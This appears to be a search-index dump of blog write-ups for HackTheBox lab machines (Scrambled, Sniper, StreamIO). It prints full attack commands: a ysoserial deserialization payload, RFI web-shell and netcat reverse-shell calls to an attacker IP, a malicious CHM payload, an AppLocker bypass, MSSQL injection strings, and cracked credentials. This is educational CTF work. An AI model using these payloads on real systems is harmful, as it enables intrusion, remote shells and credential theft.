\u0026quot;C:\\\\programdata\\\\nc64.exe 10.10.16.9 6666 -e cmd.exe\u0026quot; D:\\Tools\\ysoserial-1.35\\Release\u0026gt;.\\ysoserial.exe -f BinaryFormatter -g AxHostState -o base64 -c \u0026#34;C:\\\\programdata\\\\nc.exe 10.10.16.9 6666 -e cmd.exe\u0026#34; AAEAAAD/////AQAAAAAAAAAMAgAAAFdTeXN0ZW0uV2luZG93cy5Gb3JtcywgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFAQAAACFTeXN0ZW0uV2luZG93cy5Gb3Jtcy5BeEhvc3QrU3RhdGUBAAAAEVByb3BlcnR5QmFnQmluYXJ5BwICAAAACQMAAAAPAwAAAL8DAAACAAEAAAD/////AQAAAAAAAAAMAgAAAF5NaWNyb3NvZnQuUG93ZXJTaGVsbC5FZGl0b3IsIFZlcnNpb249My4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQEAAABCTWljcm9zb2Z0LlZpc3VhbFN0dWRpby5UZXh0LkZvcm1hdHRpbmcuVGV4dEZvcm1hdHRpbmdSdW5Qcm9wZXJ0aWVzAQAAAA9Gb3JlZ3JvdW5kQnJ1c2gBAgAAAAYDAAAA4QU8P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJ1dGYtMTYiPz4NCjxPYmplY3REYXRhUHJvdmlkZXIgTWV0aG9kTmFtZT0iU3RhcnQiIElzSW5pdGlhbExvYWRFbmFibGVkPSJGYWxzZSIgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiIgeG1sbnM6c2Q9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PVN5c3RlbSIgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiPg0KICA8T2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KICAgIDxzZDpQcm9jZXNzPg0KICAgICAgPHNkOlByb2Nlc3MuU3RhcnRJbmZvPg0KICAgICAgICA8c2Q6UHJvY2Vzc1N0YXJ0SW5mbyBBcmd1bWVudHM9Ii9jIEM6XFxwcm9ncmFtZGF0YVxcbmMuZXhlIDEwLjEwLjE2LjkgNjY2NiAtZSBjbWQuZXhlIiBTdGFuZGFyZEVycm9yRW5jb2Rpbmc9Int4Ok51bGx9IiBTdGFuZGFyZE91dHB1dEVuY29kaW5nPSJ7eDpOdWxsfSIgVXNlck5hbWU9IiIgUGFzc3dvcmQ9Int4Ok51bGx9IiBEb21haW49IiIgTG9hZFVzZXJQcm9maWxlPSJGYWxzZSIgRmlsZU5hbWU9ImNtZCIgLz4NCiAgICAgIDwvc2Q6UHJvY2Vzcy5TdGFydEluZm8+DQogICAgPC9zZDpQcm9jZXNzPg0KICA8L09iamVjdERhdGFQcm92aWRlci5PYmplY3RJbnN0YW5jZT4NCjwvT2JqZWN0RGF0YVByb3ZpZGVyPgsL Now launch listener Then connect to server via nc nc 10.10.11.168 4411 And send UPLOAD_ORDER;\u0026lt;PAYLOAD\u0026gt; If we check our listner, we have a connection ","date":"September 11, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/scrambled/images/scrambled.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/scrambled/","summary":"Scrambled Enumeration nmap └─$ nmap -Pn -p- 10.10.11.168 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-12 16:42 BST Nmap scan report for 10.10.11.168 (10.10.11.168) Host is up (0.092s latency). Not shown: 65516 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 80/tcp open http 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 1433/tcp open ms-sql-s 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5985/tcp open wsman 9389/tcp open adws 49668/tcp open unknown 49673/tcp open unknown 49674/tcp open unknown 49697/tcp open unknown 49701/tcp open unknown └─$ nmap -Pn -p53,80,88,135,139,389,445,464,593,636,1433,4411,5985,9389 -sC -sV 10.","tags":["HTB","domain-controller","kerberos","ldap","ldapsearch","impacket","kerberoast","hashcat","mssql","silver-ticket","crackstation","python","ticketer","klist","mssqlclient","winrm","reverse-engineering","wireshark","dnspy","deserialization","ysoserial.net"],"title":"[HTB] Machine: Scrambled"},{"categories":null,"contents":"Sniper Enumeration nmap └─$ nmap -Pn -p- 10.10.10.151 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-11 19:59 BST Stats: 0:17:07 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Nmap scan report for 10.10.10.151 Host is up (0.024s latency). Not shown: 65530 filtered ports PORT STATE SERVICE 80/tcp open http 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 49667/tcp open unknown └─$ nmap -Pn -p80,135,139,445 -sC -sV 10.10.10.151 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-11 20:17 BST Nmap scan report for 10.10.10.151 (10.10.10.151) Host is up (0.13s latency). PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-title: Sniper Co. |_http-server-header: Microsoft-IIS/10.0 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: 6h59m22s | smb2-time: | date: 2023-09-12T02:17:13 |_ start_date: N/A | smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required smb └─$ smbclient -N -L //10.10.10.151 session setup failed: NT_STATUS_ACCESS_DENIED Web Server gobuster └─$ gobuster dir -u http://10.10.10.151/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x txt,asp,aspx --no-error =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.151/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: txt,asp,aspx [+] Timeout: 10s =============================================================== 2023/09/12 15:57:15 Starting gobuster in directory enumeration mode =============================================================== /images (Status: 301) [Size: 150] [--\u0026gt; http://10.10.10.151/images/] /blog (Status: 301) [Size: 148] [--\u0026gt; http://10.10.10.151/blog/] /user (Status: 301) [Size: 148] [--\u0026gt; http://10.10.10.151/user/] /Images (Status: 301) [Size: 150] [--\u0026gt; http://10.10.10.151/Images/] /css (Status: 301) [Size: 147] [--\u0026gt; http://10.10.10.151/css/] /js (Status: 301) [Size: 146] [--\u0026gt; http://10.10.10.151/js/] Foothold /blog It looks like we have a LFI └─$ curl \u0026#39;http://10.10.10.151/blog/?lang=\\Windows\\System32\\drivers\\etc\\hosts\u0026#39; \u0026lt;html\u0026gt; ... \u0026lt;/html\u0026gt; # Copyright (c) 1993-2009 Microsoft Corp. # # This is a sample HOSTS file used by Microsoft TCP/IP for Windows. # # This file contains the mappings of IP addresses to host names. Each # entry should be kept on an individual line. The IP address should # be placed in the first column followed by the corresponding host name. # The IP address and the host name should be separated by at least one # space. # # Additionally, comments (such as these) may be inserted on individual # lines or following the machine name denoted by a \u0026#39;#\u0026#39; symbol. # # For example: # # 102.54.94.97 rhino.acme.com # source server # 38.25.63.10 x.acme.com # x client host # localhost name resolution is handled within DNS itself. # 127.0.0.1 localhost # ::1 localhost \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; And RFI Let\u0026rsquo;s try RFI └─$ curl \u0026#39;http://10.10.10.151/blog/?lang=\\\\10.10.16.9\\share\\shell.php\u0026amp;cmd=whoami\u0026#39; ... \u0026lt;/html\u0026gt; nt authority\\iusr \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; **** Let\u0026rsquo;s get reverse shell └─$ curl \u0026#39;http://10.10.10.151/blog/?lang=\\\\10.10.16.9\\share\\shell.php\u0026amp;cmd=\\\\10.10.16.9\\share\\nc64.exe+10.10.16.9+6666+-e+cmd.exe\u0026#39; └─$ nc -vlnp 6666 listening on [any] 6666 ... connect to [10.10.16.9] from (UNKNOWN) [10.10.10.151] 49678 Microsoft Windows [Version 10.0.17763.678] (c) 2018 Microsoft Corporation. All rights reserved. C:\\inetpub\\wwwroot\\blog\u0026gt; User C:\\inetpub\\wwwroot\\ has user folder PS C:\\inetpub\\wwwroot\\user\u0026gt; dir dir Directory: C:\\inetpub\\wwwroot\\user Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 4/11/2019 5:52 AM css d----- 4/11/2019 5:23 AM fonts d----- 4/11/2019 5:23 AM images d----- 4/11/2019 5:23 AM js d----- 4/11/2019 5:23 AM vendor -a---- 4/11/2019 5:15 PM 108 auth.php -a---- 4/11/2019 10:51 AM 337 db.php -a---- 4/11/2019 6:18 AM 4639 index.php -a---- 4/11/2019 6:10 AM 6463 login.php -a---- 4/8/2019 11:04 PM 148 logout.php -a---- 10/1/2019 8:42 AM 7192 registration.php -a---- 8/14/2019 10:35 PM 7004 registration_old123123123847.php db.php has creds PS C:\\inetpub\\wwwroot\\user\u0026gt; type db.php type db.php \u0026lt;?php // Enter your Host, username, password, database below. // I left password empty because i do not set password on localhost. $con = mysqli_connect(\u0026#34;localhost\u0026#34;,\u0026#34;dbuser\u0026#34;,\u0026#34;36mEAhz/B8xQ~2VM\u0026#34;,\u0026#34;sniper\u0026#34;); // Check connection if (mysqli_connect_errno()) { echo \u0026#34;Failed to connect to MySQL: \u0026#34; . mysqli_connect_error(); } ?\u0026gt; We can try the creds as Chris user PS C:\\\u0026gt; $user = \u0026#34;Sniper\\Chris\u0026#34; $user = \u0026#34;Sniper\\Chris\u0026#34; PS C:\\\u0026gt; $password = ConvertTo-SecureString \u0026#39;36mEAhz/B8xQ~2VM\u0026#39; -AsPlainText -Force $password = ConvertTo-SecureString \u0026#39;36mEAhz/B8xQ~2VM\u0026#39; -AsPlainText -Force PS C:\\\u0026gt; $cred = New-Object System.Management.Automation.PSCredential($user, $password) $cred = New-Object System.Management.Automation.PSCredential($user, $password) PS C:\\\u0026gt; Invoke-Command -Computer localhost -Credential $cred -ScriptBlock { whoami } Invoke-Command -Computer localhost -Credential $cred -ScriptBlock { whoami } sniper\\chris PS C:\\\u0026gt; Looks like it works Let\u0026rsquo;s get reverse shell PS C:\\\u0026gt; Invoke-Command -Computer localhost -Credential $cred -ScriptBlock {\\\\10.10.16.9\\share\\nc64.exe 10.10.16.9 7777 -e cmd.exe} Invoke-Command -Computer localhost -Credential $cred -ScriptBlock {\\\\10.10.16.9\\share\\nc64.exe 10.10.16.9 7777 -e cmd.exe} Root whoami C:\\Users\\Chris\u0026gt;whoami /priv whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ============================== ======= SeChangeNotifyPrivilege Bypass traverse checking Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Enabled C:\\Users\\Chris\u0026gt;whoami /groups whoami /groups GROUP INFORMATION ----------------- Group Name Type SID Attributes ====================================== ================ ============ ================================================== Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group BUILTIN\\Remote Management Users Alias S-1-5-32-580 Mandatory group, Enabled by default, Enabled group BUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\NETWORK Well-known group S-1-5-2 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Local account Well-known group S-1-5-113 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\NTLM Authentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled group Mandatory Label\\Medium Mandatory Level Label S-1-16-8192 We have a docs C:\\Users\\Chris\u0026gt;dir Downloads dir Downloads Volume in drive C has no label. Volume Serial Number is AE98-73A8 Directory of C:\\Users\\Chris\\Downloads 04/11/2019 08:36 AM \u0026lt;DIR\u0026gt; . 04/11/2019 08:36 AM \u0026lt;DIR\u0026gt; .. 04/11/2019 08:36 AM 10,462 instructions.chm 1 File(s) 10,462 bytes 2 Dir(s) 2,353,213,440 bytes free We have also a note in C:\\Docs folder c:\\\u0026gt;dir Docs dir Docs Volume in drive C has no label. Volume Serial Number is AE98-73A8 Directory of c:\\Docs 10/01/2019 01:04 PM \u0026lt;DIR\u0026gt; . 10/01/2019 01:04 PM \u0026lt;DIR\u0026gt; .. 04/11/2019 09:31 AM 285 note.txt 04/11/2019 09:17 AM 552,607 php for dummies-trial.pdf 2 File(s) 552,892 bytes 2 Dir(s) 2,353,213,440 bytes free c:\\\u0026gt;cd Docs cd Docs c:\\Docs\u0026gt;type note.txt type note.txt Hi Chris, Your php skillz suck. Contact yamitenshi so that he teaches you how to use it and after that fix the website as there are a lot of bugs on it. And I hope that you\u0026#39;ve prepared the documentation for our new app. Drop it here when you\u0026#39;re done with it. Regards, Sniper CEO. c:\\Docs\u0026gt; Looks like if we drop .chm file to c:/Docs folder, it will be opened We can use https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1 to create a malicious .chm and drop it to Docs Let\u0026rsquo;s do it PS D:\\VMs\\Shared\u0026gt; Out-CHM -Payload \u0026#34;\\windows\\system32\\spool\\drivers\\color\\nc64.exe -e cmd 10.10.16.9 8888\u0026#34; -HHCPath \u0026#34;C:\\Program Files (x86)\\HTML Help Workshop\u0026#34; Microsoft HTML Help Compiler 4.74.8702 Compiling d:\\VMs\\Shared\\doc.chm Compile time: 0 minutes, 0 seconds 2 Topics 4 Local links 4 Internet links 0 Graphics Created d:\\VMs\\Shared\\doc.chm, 13,458 bytes Compression increased file by 265 bytes. Now we have to save nc to folder to bypass Applocker https://book.hacktricks.xyz/windows-hardening/authentication-credentials-uac-and-efs#bypass PS C:\\Users\\Chris\\Downloads\u0026gt; iwr 10.10.16.9/nc64.exe -outfile c:\\windows\\system32\\spool\\drivers\\color\\nc64.exe iwr 10.10.16.9/nc64.exe -outfile c:\\windows\\system32\\spool\\drivers\\color\\nc64.exe PS C:\\Users\\Chris\\Downloads\u0026gt; ls \\windows\\system32\\spool\\drivers\\color\\nc64.exe ls \\windows\\system32\\spool\\drivers\\color\\nc64.exe Directory: C:\\windows\\system32\\spool\\drivers\\color Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 9/16/2023 11:16 AM 45272 nc64.exe Now, let\u0026rsquo;s upload the .chm file and save it to C:/Docs PS C:\\Users\\Chris\\Downloads\u0026gt; iwr 10.10.16.9/doc.chm -outfile doc.chm iwr 10.10.16.9/doc.chm -outfile doc.chm PS C:\\Users\\Chris\\Downloads\u0026gt; ls ls Directory: C:\\Users\\Chris\\Downloads Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 9/16/2023 11:16 AM 13458 doc.chm -a---- 4/11/2019 8:36 AM 10462 instructions.chm PS C:\\Users\\Chris\\Downloads\u0026gt; copy doc.chm \\Docs copy doc.chm \\Docs PS C:\\Users\\Chris\\Downloads\u0026gt; ls \\Docs ls \\Docs Directory: C:\\Docs Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 9/16/2023 11:16 AM 13458 doc.chm -a---- 4/11/2019 9:31 AM 285 note.txt -a---- 4/11/2019 9:17 AM 552607 php for dummies-trial.pdf After few minutes, we have our connection Alternative path to Foothold Check 0xdf and Ippsec for LFI exploit chain to get a foothold ","date":"September 11, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/sniper/images/sniper.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/sniper/","summary":"Sniper Enumeration nmap └─$ nmap -Pn -p- 10.10.10.151 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-11 19:59 BST Stats: 0:17:07 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Nmap scan report for 10.10.10.151 Host is up (0.024s latency). Not shown: 65530 filtered ports PORT STATE SERVICE 80/tcp open http 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 49667/tcp open unknown └─$ nmap -Pn -p80,135,139,445 -sC -sV 10.","tags":["HTB","lfi","rfi","impacket-smbserver","log-poisoning","powershell","webshell","powershell-run-as","chm","nishang"],"title":"[HTB] Machine: Sniper"},{"categories":null,"contents":"StreamIO Enumeration nmap └─$ nmap -Pn -p- 10.10.11.158 -T4 --min-rate 10000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-13 19:18 BST Nmap scan report for 10.10.11.158 (10.10.11.158) Host is up (0.10s latency). Not shown: 65517 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 80/tcp open http 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 443/tcp open https 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 5985/tcp open wsman 9389/tcp open adws 49667/tcp open unknown 49673/tcp open unknown 49674/tcp open unknown 49701/tcp open unknown 55287/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 32.55 seconds └─$ nmap -Pn -p53,80,88,135,139,389,443,445,464,593,636,3268,3269,5985,9389 -sC -sV 10.10.11.158 -T4 --min-rate 10000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-13 19:19 BST Nmap scan report for 10.10.11.158 (10.10.11.158) Host is up (0.16s latency). PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-title: IIS Windows Server 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-09-14 01:19:00Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name) 443/tcp open ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 | ssl-cert: Subject: commonName=streamIO/countryName=EU | Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb | Not valid before: 2022-02-22T07:03:28 |_Not valid after: 2022-03-24T07:03:28 |_ssl-date: 2023-09-14T01:19:51+00:00; +6h59m23s from scanner time. |_http-title: Not Found | tls-alpn: |_ http/1.1 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp filtered globalcatLDAP 3269/tcp filtered globalcatLDAPssl 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 9389/tcp open mc-nmf .NET Message Framing Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required |_clock-skew: mean: 6h59m22s, deviation: 0s, median: 6h59m21s | smb2-time: | date: 2023-09-14T01:19:15 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 59.52 seconds smb └─$ smbclient -N -L //10.10.11.158 session setup failed: NT_STATUS_ACCESS_DENIED dns └─$ dig @10.10.11.158 streamIO.htb ; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.18.16-1-Debian \u0026lt;\u0026lt;\u0026gt;\u0026gt; @10.10.11.158 streamIO.htb ; (1 server found) ;; global options: +cmd ;; Got answer: ;; -\u0026gt;\u0026gt;HEADER\u0026lt;\u0026lt;- opcode: QUERY, status: NOERROR, id: 13035 ;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1 ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 4000 ;; QUESTION SECTION: ;streamIO.htb. IN A ;; ANSWER SECTION: streamIO.htb. 600 IN A 10.10.11.158 ;; Query time: 100 msec ;; SERVER: 10.10.11.158#53(10.10.11.158) (UDP) ;; WHEN: Wed Sep 13 19:26:32 BST 2023 ;; MSG SIZE rcvd: 57 └─$ dig axfr @10.10.11.158 streamIO.htb ; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.18.16-1-Debian \u0026lt;\u0026lt;\u0026gt;\u0026gt; axfr @10.10.11.158 streamIO.htb ; (1 server found) ;; global options: +cmd ; Transfer failed. vhosts └─$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u https://watch.streamIO.htb -H \u0026#39;Host: FUZZ.streamIO.htb\u0026#39; --hh 315 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz\u0026#39;s documentation for more information. ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: https://watch.streamIO.htb/ Total requests: 100000 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000003520: 200 78 L 245 W 2829 Ch \u0026#34;watch\u0026#34; 000037212: 400 6 L 26 W 334 Ch \u0026#34;*\u0026#34; Total time: 1237.048 Processed Requests: 100000 Filtered Requests: 99998 Requests/sec.: 80.83756 └─$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://watch.streamIO.htb -H \u0026#39;Host: FUZZ.streamIO.htb\u0026#39; --hh 703 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz\u0026#39;s documentation for more information. ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: http://watch.streamIO.htb/ Total requests: 100000 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000037212: 400 6 L 26 W 334 Ch \u0026#34;*\u0026#34; Total time: 1021.031 Processed Requests: 100000 Filtered Requests: 99999 Requests/sec.: 66.52712 Web Server Port 80 Web Server Port 443 gobuster └─$ gobuster dir -u https://streamio.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x txt,php --no-error -k =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: https://streamio.htb/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: php,txt [+] Timeout: 10s =============================================================== 2023/09/16 14:46:18 Starting gobuster in directory enumeration mode =============================================================== /about.php (Status: 200) [Size: 7825] /index.php (Status: 200) [Size: 13497] /images (Status: 301) [Size: 151] [--\u0026gt; https://streamio.htb/images/] /contact.php (Status: 200) [Size: 6434] /login.php (Status: 200) [Size: 4145] /register.php (Status: 200) [Size: 4500] /Images (Status: 301) [Size: 151] [--\u0026gt; https://streamio.htb/Images/] /admin (Status: 301) [Size: 150] [--\u0026gt; https://streamio.htb/admin/] /css (Status: 301) [Size: 148] [--\u0026gt; https://streamio.htb/css/] /Contact.php (Status: 200) [Size: 6434] /About.php (Status: 200) [Size: 7825] /Index.php (Status: 200) [Size: 13497] /Login.php (Status: 200) [Size: 4145] /js (Status: 301) [Size: 147] [--\u0026gt; https://streamio.htb/js/] /logout.php (Status: 302) [Size: 0] [--\u0026gt; https://streamio.htb/] /Register.php (Status: 200) [Size: 4500] /fonts (Status: 301) [Size: 150] [--\u0026gt; https://streamio.htb/fonts/] /IMAGES (Status: 301) [Size: 151] [--\u0026gt; https://streamio.htb/IMAGES/] /INDEX.php (Status: 200) [Size: 13497] /Fonts (Status: 301) [Size: 150] [--\u0026gt; https://streamio.htb/Fonts/] /Admin (Status: 301) [Size: 150] [--\u0026gt; https://streamio.htb/Admin/] /*checkout* (Status: 400) [Size: 3420] /CSS (Status: 301) [Size: 148] [--\u0026gt; https://streamio.htb/CSS/] /JS (Status: 301) [Size: 147] [--\u0026gt; https://streamio.htb/JS/] └─$ gobuster dir -u https://watch.streamio.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x txt,php --no-error -k =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: https://watch.streamio.htb/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: txt,php [+] Timeout: 10s =============================================================== 2023/09/16 14:46:49 Starting gobuster in directory enumeration mode =============================================================== /index.php (Status: 200) [Size: 2829] /search.php (Status: 200) [Size: 253887] /static (Status: 301) [Size: 157] [--\u0026gt; https://watch.streamio.htb/static/] /Search.php (Status: 200) [Size: 253887] /Index.php (Status: 200) [Size: 2829] /INDEX.php (Status: 200) [Size: 2829] /*checkout* (Status: 400) [Size: 3420] /*docroot* (Status: 400) [Size: 3420] /* (Status: 400) [Size: 3420] /blocked.php (Status: 200) [Size: 677] Foothold I registered on the streamio.htb but couldn\u0026rsquo;t login Clicking on watch button on watch.streamio.htb results in error The website also has blocked.php endpoint Probably WAF When we search for dog, it shows every movie containing \u0026lsquo;dog\u0026rsquo; The same goes for test It looks like the query is SELECT * FROM MOVIES WHERE NAME LIKE '%dog%'; Thus if the statement is correct, we could try injecting man';-- - If the query is injectable, we should get all movies that end with man There were no movies that end with dog And it works We could start with stealing the hash Start responder sudo responder -I tun0 The payload man'; use master; exec xp_dirtree '\\\\10.10.16.4\\anything';-- - But hashcat has no results hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt So let\u0026rsquo;s try dumping the database https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server We can UNION-based injections But we have to find the number of collumns The final payload test' union select 1,2,3,4,5,6;-- - We can use collumns 2 and 3 to dump the data Let\u0026rsquo;s check the databases test' union select 1,name,3,4,5,6 from master.dbo.sysdatabases;-- - Now we dump the tables Find the current database test' union select 1,(SELECT DB_NAME()),3,4,5,6;-- - Enumerate table names test' union select 1,name,id,4,5,6 FROM sysobjects WHERE xtype='U';-- - Dump users table Find the columns test' union select 1,name,id,4,5,6 FROM syscolumns WHERE id = 901578250;-- - Dump the table test' union select 1,concat(username,':', password), 3,4,5,6 FROM users;-- - Let\u0026rsquo;s try cracking them └─$ hashcat -m 0 user-hash.list /usr/share/wordlists/rockyou.txt --user hashcat (v6.2.6) starting OpenCL API (OpenCL 3.0 PoCL 3.1+debian Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project] ================================================================================================================================================== * Device #1: pthread-sandybridge-12th Gen Intel(R) Core(TM) i5-12400, 1436/2936 MB (512 MB allocatable), 2MCU Minimum password length supported by kernel: 0 Maximum password length supported by kernel: 256 Hashes: 30 digests; 30 unique digests, 1 unique salts Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates Rules: 1 ... 3577c47eb1e12c8ba021611e1280753c:highschoolmusical ee0b8a0937abd60c2882eacb2f8dc49f:physics69i 665a50ac9eaa781e4f7f04199db97a11:paddpadd b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls.. ef8f3d30a856cf166fb8215aca93e9ff:%$clara 2a4e2cf22dd8fcb45adcb91be1e22ae8:$monique$1991$ 54c88b2dbd7b1a84012fabc1a4c73415:$hadoW 6dcd87740abb64edfa36d170f0d5450d:$3xybitch 08344b85b329d7efd611b7a7743e8a09:##123a8j8w5123## b83439b16f844bd6ffe35c02fe21b3c0:!?Love?!123 b22abb47a02b52d5dfa27fb0b534f693:!5psycho8! f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$ Approaching final keyspace - workload adjusted. ... admin:665a50ac9eaa781e4f7f04199db97a11:paddpadd Barry:54c88b2dbd7b1a84012fabc1a4c73415:$hadoW Bruno:2a4e2cf22dd8fcb45adcb91be1e22ae8:$monique$1991$ Clara:ef8f3d30a856cf166fb8215aca93e9ff:%$clara Juliette:6dcd87740abb64edfa36d170f0d5450d:$3xybitch Lauren:08344b85b329d7efd611b7a7743e8a09:##123a8j8w5123## Lenord:ee0b8a0937abd60c2882eacb2f8dc49f:physics69i Michelle:b83439b16f844bd6ffe35c02fe21b3c0:!?Love?!123 Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$ Thane:3577c47eb1e12c8ba021611e1280753c:highschoolmusical Victoria:b22abb47a02b52d5dfa27fb0b534f693:!5psycho8! yoshihide:b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls.. But none of them works for smb └─$ crackmapexec smb 10.10.11.158 -u user.list -p pass.list --no-bruteforce --continue-on-success SMB 10.10.11.158 445 DC [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False) SMB 10.10.11.158 445 DC [-] 